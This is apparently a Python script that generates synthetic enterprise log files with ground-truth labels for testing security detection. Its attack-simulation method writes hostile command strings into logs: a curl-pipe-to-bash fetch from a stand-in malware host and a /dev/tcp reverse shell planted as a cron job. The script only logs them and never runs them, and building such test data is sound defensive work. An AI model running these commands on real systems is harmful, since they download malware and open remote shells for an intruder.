import time
import random
import uuid
from datetime import datetime
import os
import json
from seed_data import DATA_POOLS

BASE_DIR = os.path.join(os.getcwd(), "data", "logs")

class EnterpriseLogGenerator:
    def __init__(self):
        self.hosts = DATA_POOLS["hosts"]
        self.users = DATA_POOLS["users"]
        self.internal_ips = [f"10.50.1.{i}" for i in range(10, 250)]
        
        self.destinations = {
            "http": os.path.join(BASE_DIR, "nginx", "access.log"),
            "auth": os.path.join(BASE_DIR, "auth", "secure.log"),
            "network": os.path.join(BASE_DIR, "firewall", "trace.log"),
            "system": os.path.join(BASE_DIR, "system", "syslog.log"),
            "api": os.path.join(BASE_DIR, "apps", "api.log"),
            # --- FIXED: Added the missing ground_truth key ---
            "ground_truth": os.path.join(BASE_DIR, "meta", "ground_truth.json") 
        }
        
        # --- FIXED: Ensure the 'meta' directory exists ---
        os.makedirs(os.path.dirname(self.destinations["ground_truth"]), exist_ok=True)

    def write(self, category, log, intent="background", outcome="success"):
        # 1. Write the raw log to the file (what Vector sees)
        target_file = self.destinations.get(category)
        with open(target_file, "a") as f:
            f.write(log + "\n")
        
        # 2. Write the Ground Truth (what YOU see for validation)
        if intent != "background":
            meta = {
                "timestamp": datetime.now().isoformat(),
                "category": category,
                "class_uid": self._get_class_uid(category), 
                "intent": intent,     
                "outcome": outcome,   
                "raw_log": log
            }
            # This line caused the error because the key didn't exist
            with open(self.destinations["ground_truth"], "a") as f:
                f.write(json.dumps(meta) + "\n")

    def _get_class_uid(self, category):
        return {"http": 4002, "auth": 3002, "network": 4001, "system": 1007, "api": 6003}.get(category, 0)        
    
    def gen_4002_http(self, ip=None, status=None, path=None, intent="background"):
        ip = ip or random.choice(self.internal_ips)
        status = status or random.choices(["200", "404", "500", "302", "401"], weights=[75, 10, 5, 5, 5])[0]
        path = path or random.choice(DATA_POOLS["endpoints"])
        agent = random.choice(DATA_POOLS["user_agents"])
        size = random.randint(100, 15000)
        ts = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
        
        log = f'{ip} - - [{ts}] "GET {path} HTTP/1.1" {status} {size} "-" "{agent}"'
        outcome_str = "success" if str(status).startswith(("2", "3")) else "failure"
        self.write("http", log, intent=intent, outcome=outcome_str)

    def gen_4001_network(self, action=None, src_ip=None, dst_ip=None, dst_port=None, intent="background"):
        action = action or random.choices(["ALLOW", "DENY"], weights=[85, 15])[0]
        src = src_ip or random.choice(self.internal_ips)
        dst = dst_ip or f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        port = dst_port or random.choice([80, 443, 22, 3306, 5432, 8080, 27017])
        
        ts = datetime.now().isoformat()
        log = f'{ts} fw-core-01 filter: {action} TCP {src}:{random.randint(30000, 65000)} -> {dst}:{port} (policy: Default_Drop)'
        self.write("network", log, intent=intent, outcome=action.lower())

    def gen_3002_auth(self, success=True, user=None, ip=None, intent="background"):
        user = user or random.choice(self.users)
        ip = ip or random.choice(self.internal_ips)
        host = random.choice(self.hosts)
        ts = datetime.now().strftime("%b %d %H:%M:%S")
        
        msg = "Accepted password" if success else "Failed password"
        pid = random.randint(100, 9999)
        
        log = f'{ts} {host} sshd[{pid}]: {msg} for {user} from {ip} port {random.randint(1024, 65535)} ssh2'
        outcome_str = "success" if success else "failure"
        self.write("auth", log, intent=intent, outcome=outcome_str)

    def gen_3001_account_change(self, user=None, action_type=None, intent="background"):
        ts = datetime.now().strftime("%b %d %H:%M:%S")
        user = user or random.choice(self.users)
        
        if action_type == "add":
            log_msg = f"useradd[{random.randint(100, 999)}]: new user added - name={user}"
        elif action_type == "password":
            log_msg = f"passwd[{random.randint(100, 999)}]: password changed for {user}"
        else:
            act = random.choice(["useradd", "passwd"])
            suffix = f"new user added - name={user}_{random.randint(1,100)}" if act == "useradd" else f"password changed for {user}"
            log_msg = f"{act}[{random.randint(100, 999)}]: {suffix}"

        log = f'{ts} dc-01 {log_msg}'
        self.write("auth", log, intent=intent, outcome="success")

    def gen_1006_scheduled_job(self, cmd=None, user="root", intent="background"):
        ts = datetime.now().strftime("%b %d %H:%M:%S")
        host = random.choice(self.hosts)
        task = cmd or random.choice(DATA_POOLS["cron_tasks"])
        
        log = f'{ts} {host} cron[{random.randint(100, 999)}]: ({user}) CMD ( {task} )'
        self.write("system", log, intent=intent, outcome="success")

    def gen_1007_process_activity(self, proc_name=None, intent="background"):
        ts = datetime.now().strftime("%b %d %H:%M:%S")
        host = random.choice(self.hosts)
        
        if proc_name:
            msg = f"kernel: process {proc_name} started with pid {random.randint(1000,9999)}"
        else:
            raw_msg = random.choice(DATA_POOLS["syslog_msgs"])
            msg = raw_msg.format(
                n=random.randint(1, 4096), 
                user=random.choice(self.users),
                container_id=uuid.uuid4().hex[:12]
            )
            
        log = f'{ts} {host} {msg}'
        self.write("system", log, intent=intent, outcome="success")

    def gen_6003_api(self, method=None, endpoint=None, status=None, intent="background"):
        ts = datetime.now().isoformat()
        method = method or random.choice(["GET", "POST", "PUT", "DELETE"])
        endpoint = endpoint or random.choice(DATA_POOLS["api_endpoints"])
        status = status or random.choices([200, 201, 400, 403, 503], weights=[80, 10, 5, 3, 2])[0]
        lat = random.randint(5, 500)
        
        log = f'{ts} api-srv: method={method} endpoint={endpoint} status={status} latency={lat}ms'
        outcome_str = "success" if str(status).startswith("2") else "failure"
        self.write("api", log, intent=intent, outcome=outcome_str)

    def normal_traffic(self):
        funcs = [self.gen_4002_http, self.gen_4001_network, self.gen_1006_scheduled_job, 
                 self.gen_1007_process_activity, self.gen_6003_api, self.gen_3002_auth]
        random.choice(funcs)()

    def attack_pattern_persistence(self, attacker_ip="45.33.22.11"):
        print(f"💀 Simulating Persistence Attack from {attacker_ip}...")
        self.gen_4002_http(ip=attacker_ip, path="/cgi-bin/vulnerable.sh", status="200", intent="exploitation")
        time.sleep(0.5)
        self.gen_1007_process_activity(proc_name="curl http://malware.com/shell | bash", intent="execution")
        time.sleep(0.5)
        self.gen_3001_account_change(user="backdoor_user", action_type="add", intent="persistence")
        time.sleep(0.5)
        self.gen_1006_scheduled_job(cmd="/bin/bash -i >& /dev/tcp/45.33.22.11/443 0>&1", user="backdoor_user", intent="persistence")

if __name__ == "__main__":
    gen = EnterpriseLogGenerator()
    print(f"🚀 High-Variation Multi-File Simulator started.")
    try:
        while True:
            for _ in range(random.randint(10, 30)):
                gen.normal_traffic()
                if random.random() > 0.98: gen.gen_3001_account_change()
                time.sleep(random.uniform(0.05, 0.2))

            if random.random() > 0.85:
                gen.attack_pattern_persistence(attacker_ip=f"185.220.101.{random.randint(1,254)}")
    except KeyboardInterrupt:
        print("\n🛑 Simulation stopped.")